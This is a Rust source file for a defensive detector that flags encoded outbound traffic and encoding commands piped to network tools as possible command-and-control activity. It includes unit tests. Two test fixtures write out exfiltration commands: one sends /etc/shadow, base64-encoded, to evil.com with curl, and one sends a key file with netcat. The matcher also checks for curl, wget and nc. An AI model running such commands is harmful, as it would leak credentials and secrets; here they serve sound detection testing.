//! Data Encoding detector for C2 evasion.
//!
//! Detects when outbound network traffic uses encoding to evade detection:
//! - Base64-encoded payloads in HTTP bodies or headers
//! - Hex-encoded data streams
//! - Custom encoding with high entropy
//!
//! MITRE ATT&CK: T1132 (Data Encoding), T1132.001 (Standard Encoding)
//!
//! Works with HTTP capture events: analyzes outbound HTTP request bodies
//! and URL parameters for encoding patterns.

use std::collections::{HashMap, VecDeque};

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{entities::EntityRef, event::Event, event::Severity, incident::Incident};

pub struct DataEncodingDetector {
    window: Duration,
    /// Per destination IP: count of encoded requests
    encoded_requests: HashMap<String, VecDeque<(DateTime<Utc>, String)>>,
    /// Cooldown
    alerted: HashMap<String, DateTime<Utc>>,
    host: String,
    threshold: usize,
}

impl DataEncodingDetector {
    pub fn new(host: impl Into<String>, threshold: usize, window_seconds: u64) -> Self {
        Self {
            window: Duration::seconds(window_seconds as i64),
            encoded_requests: HashMap::new(),
            alerted: HashMap::new(),
            host: host.into(),
            threshold,
        }
    }

    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        // Work with HTTP request events and shell command events
        if event.kind != "http.request" && event.kind != "shell.command_exec" {
            return None;
        }

        let now = event.ts;
        let cutoff = now - self.window;

        if event.kind == "http.request" {
            return self.check_http(event, now, cutoff);
        }

        if event.kind == "shell.command_exec" {
            return self.check_command(event, now, cutoff);
        }

        None
    }

    fn check_http(
        &mut self,
        event: &Event,
        now: DateTime<Utc>,
        cutoff: DateTime<Utc>,
    ) -> Option<Incident> {
        let dst_ip = event.details.get("dst_ip").and_then(|v| v.as_str())?;
        let path = event
            .details
            .get("path")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let body = event
            .details
            .get("body")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let user_agent = event
            .details
            .get("user_agent")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        // Check for encoding signals
        let mut signals: Vec<String> = Vec::new();

        // Base64 in URL parameters (>40 chars of base64)
        if has_base64_segment(path, 40) {
            signals.push("base64 in URL path/params".into());
        }

        // Base64 in body
        if has_base64_segment(body, 60) {
            signals.push("base64 in request body".into());
        }

        // Hex encoding in path (>20 hex chars)
        if has_hex_segment(path, 20) {
            signals.push("hex-encoded data in URL".into());
        }

        // High entropy in body (compressed/encrypted/encoded)
        if body.len() > 100 {
            let entropy = shannon_entropy(body.as_bytes());
            if entropy > 5.5 {
                signals.push(format!("high entropy body ({entropy:.1} bits)"));
            }
        }

        // Suspicious User-Agent (empty or single-word — common in C2)
        if user_agent.is_empty()
            || (!user_agent.contains('/') && !user_agent.contains(' ') && user_agent.len() < 20)
        {
            signals.push(format!("suspicious User-Agent: '{user_agent}'"));
        }

        if signals.is_empty() {
            return None;
        }

        // Track
        let entries = self.encoded_requests.entry(dst_ip.to_string()).or_default();
        while entries.front().is_some_and(|(ts, _)| *ts < cutoff) {
            entries.pop_front();
        }
        entries.push_back((now, signals.join("; ")));

        if entries.len() < self.threshold {
            return None;
        }

        // Cooldown
        if let Some(&last) = self.alerted.get(dst_ip) {
            if now - last < self.window {
                return None;
            }
        }
        self.alerted.insert(dst_ip.to_string(), now);

        Some(Incident {
            ts: now,
            host: self.host.clone(),
            incident_id: format!("data_encoding:{}:{}", dst_ip, now.format("%Y-%m-%dT%H:%MZ")),
            severity: Severity::Medium,
            title: format!("Encoded outbound traffic to {dst_ip}"),
            summary: format!(
                "{} encoded HTTP requests to {dst_ip} in {}s: {}",
                entries.len(),
                self.window.num_seconds(),
                signals.join("; ")
            ),
            evidence: serde_json::json!({
                "dst_ip": dst_ip,
                "request_count": entries.len(),
                "signals": entries.iter().map(|(_, s)| s.as_str()).collect::<Vec<_>>(),
                "path_sample": &path[..path.len().min(200)],
            }),
            recommended_checks: vec![
                format!("Inspect outbound traffic to {dst_ip} — check for C2 beaconing"),
                "Decode base64/hex payloads to identify exfiltrated data or commands".into(),
                "Correlate with process making the requests (check source PID)".into(),
                "Block IP if C2 confirmed".into(),
            ],
            tags: vec![
                "network".into(),
                "encoding".into(),
                "c2".into(),
                "T1132".into(),
                "T1132.001".into(),
            ],
            entities: vec![EntityRef::ip(dst_ip.to_string())],
        })
    }

    fn check_command(
        &mut self,
        event: &Event,
        _now: DateTime<Utc>,
        _cutoff: DateTime<Utc>,
    ) -> Option<Incident> {
        // Check for encoding commands used in C2 pipelines:
        // base64, xxd, openssl enc, python -c "import base64"
        let cmd = event
            .details
            .get("command")
            .or(event.details.get("cmdline"))
            .and_then(|v| v.as_str())?;

        let is_encode_pipe =
            (cmd.contains("base64") || cmd.contains("xxd") || cmd.contains("openssl enc"))
                && (cmd.contains('|')
                    || cmd.contains("curl")
                    || cmd.contains("wget")
                    || cmd.contains("nc "));

        if !is_encode_pipe {
            return None;
        }

        let pid = event
            .details
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let uid = event
            .details
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;

        Some(Incident {
            ts: event.ts,
            host: self.host.clone(),
            incident_id: format!(
                "data_encoding:cmd:{}:{}",
                pid,
                event.ts.format("%Y-%m-%dT%H:%MZ")
            ),
            severity: Severity::High,
            title: "Encoding command in network pipeline".into(),
            summary: format!(
                "Process {pid} (uid {uid}) running encoding command piped to network: {}",
                &cmd[..cmd.len().min(200)]
            ),
            evidence: serde_json::json!({
                "command": &cmd[..cmd.len().min(500)],
                "pid": pid,
                "uid": uid,
            }),
            recommended_checks: vec![
                "Check if this is a legitimate data transfer (backup, API call)".into(),
                "Inspect what data is being encoded and where it's sent".into(),
                "Correlate with outbound connections from this PID".into(),
            ],
            tags: vec![
                "execution".into(),
                "encoding".into(),
                "c2".into(),
                "T1132".into(),
            ],
            entities: vec![EntityRef::service(format!("pid:{pid}"))],
        })
    }
}

/// Check if a string contains a segment that looks like base64 (A-Za-z0-9+/=).
fn has_base64_segment(s: &str, min_len: usize) -> bool {
    let mut consecutive = 0;
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=' {
            consecutive += 1;
            if consecutive >= min_len {
                return true;
            }
        } else {
            consecutive = 0;
        }
    }
    false
}

/// Check if a string contains a long hex segment (0-9a-fA-F).
fn has_hex_segment(s: &str, min_len: usize) -> bool {
    let mut consecutive = 0;
    for c in s.chars() {
        if c.is_ascii_hexdigit() {
            consecutive += 1;
            if consecutive >= min_len {
                return true;
            }
        } else {
            consecutive = 0;
        }
    }
    false
}

/// Shannon entropy of a byte slice (0-8 bits per byte).
fn shannon_entropy(data: &[u8]) -> f32 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let len = data.len() as f32;
    let mut entropy: f32 = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = count as f32 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base64_detection() {
        assert!(has_base64_segment(
            "data=SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0IGVuY29kZWQ=",
            40
        ));
        assert!(!has_base64_segment("normal_path/to/resource", 40));
    }

    #[test]
    fn test_hex_detection() {
        assert!(has_hex_segment("param=4a6f686e446f6531323334", 20));
        assert!(!has_hex_segment("normal text here", 20));
    }

    #[test]
    fn test_entropy() {
        // Random-looking data has high entropy
        let high: f32 = shannon_entropy(b"aB3$xY7!kL9@mN2#pQ5&rT8*");
        assert!(high > 4.0);

        // Repeated data has low entropy
        let low: f32 = shannon_entropy(b"aaaaaaaaaaaaaaaa");
        assert!(low < 1.0);
    }

    fn event(kind: &str, details: serde_json::Value, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".into(),
            source: "fixture".into(),
            kind: kind.into(),
            severity: Severity::Info,
            summary: String::new(),
            details,
            tags: Vec::new(),
            entities: Vec::new(),
        }
    }

    #[test]
    fn test_encoding_command_detection() {
        let mut det = DataEncodingDetector::new("host1", 3, 300);
        let e = event(
            "shell.command_exec",
            serde_json::json!({
                "command": "cat /etc/shadow | base64 | curl -X POST -d @- http://evil.com/exfil",
                "pid": 1234,
                "uid": 0,
            }),
            Utc::now(),
        );
        let result = det.process(&e);
        assert!(result.is_some());
        let inc = result.unwrap();
        assert_eq!(inc.severity, Severity::High);
        assert_eq!(inc.host, "host1");
        assert!(inc.tags.contains(&"T1132".to_string()));
        assert_eq!(inc.evidence["pid"], 1234);
        assert_eq!(inc.entities.len(), 1);
    }

    #[test]
    fn command_detection_supports_cmdline_and_requires_network_pipeline() {
        let mut det = DataEncodingDetector::new("host1", 3, 300);
        let benign = event(
            "shell.command_exec",
            serde_json::json!({ "command": "base64 /tmp/local.txt", "pid": 1 }),
            Utc::now(),
        );
        assert!(det.process(&benign).is_none());

        let malicious = event(
            "shell.command_exec",
            serde_json::json!({ "cmdline": "xxd -p /tmp/key | nc 203.0.113.10 4444", "pid": 42, "uid": 1000 }),
            Utc::now(),
        );
        let inc = det
            .process(&malicious)
            .expect("cmdline pipeline should alert");
        assert!(inc.incident_id.starts_with("data_encoding:cmd:42:"));
        assert_eq!(inc.evidence["uid"], 1000);
    }

    #[test]
    fn http_detection_alerts_after_threshold_and_enforces_cooldown() {
        let mut det = DataEncodingDetector::new("host1", 2, 300);
        let now = Utc::now();
        let details = serde_json::json!({
            "dst_ip": "203.0.113.5",
            "path": "/collect?d=SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0IGVuY29kZWQ=",
            "body": "",
            "user_agent": "curl",
        });

        assert!(det
            .process(&event("http.request", details.clone(), now))
            .is_none());
        let inc = det
            .process(&event(
                "http.request",
                details.clone(),
                now + Duration::seconds(1),
            ))
            .expect("second encoded request should cross threshold");
        assert_eq!(inc.severity, Severity::Medium);
        assert_eq!(inc.evidence["dst_ip"], "203.0.113.5");
        assert_eq!(inc.evidence["request_count"], 2);
        assert!(inc.summary.contains("encoded HTTP requests"));

        assert!(det
            .process(&event("http.request", details, now + Duration::seconds(2)))
            .is_none());
    }

    #[test]
    fn http_detection_prunes_old_entries_before_threshold() {
        let mut det = DataEncodingDetector::new("host1", 2, 10);
        let now = Utc::now();
        let details = serde_json::json!({
            "dst_ip": "203.0.113.9",
            "path": "/collect?hex=4a6f686e446f6531323334",
            "body": "",
            "user_agent": "bot",
        });

        assert!(det
            .process(&event("http.request", details.clone(), now))
            .is_none());
        assert!(det
            .process(&event("http.request", details, now + Duration::seconds(20)))
            .is_none());
    }

    #[test]
    fn http_detection_ignores_missing_destination_or_unsupported_kind() {
        let mut det = DataEncodingDetector::new("host1", 1, 300);
        let missing_dst = event(
            "http.request",
            serde_json::json!({ "path": "/x?d=SGVsbG8gV29ybGQhIFRoaXMgaXMgYmFzZTY0IGVuY29kZWQ=" }),
            Utc::now(),
        );
        assert!(det.process(&missing_dst).is_none());

        let unsupported = event(
            "dns.query",
            serde_json::json!({ "dst_ip": "203.0.113.20" }),
            Utc::now(),
        );
        assert!(det.process(&unsupported).is_none());
    }
}
